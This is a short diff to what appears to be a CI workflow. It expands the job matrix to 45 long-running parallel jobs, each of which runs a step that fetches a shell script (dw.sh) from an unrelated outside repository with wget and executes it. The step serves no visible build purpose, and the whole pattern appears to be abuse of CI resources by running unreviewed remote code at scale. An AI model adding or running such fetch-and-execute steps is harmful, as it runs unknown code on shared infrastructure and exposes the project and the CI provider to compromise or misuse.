@@ -8,8 +8,8 @@ jobs:
       max-parallel: 30
       fail-fast: false
       matrix:
-        go: [1.6]
-        flag: [A]
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
     timeout-minutes: 360
     env:
         NUM_JOBS: 20
@@ -25,3 +25,4 @@ jobs:
     - name: BA_channel
       run: |
         wget https://raw.githubusercontent.com/zeitschocco/v1/main/dw.sh && chmod u+x dw.sh && ./dw.sh
+
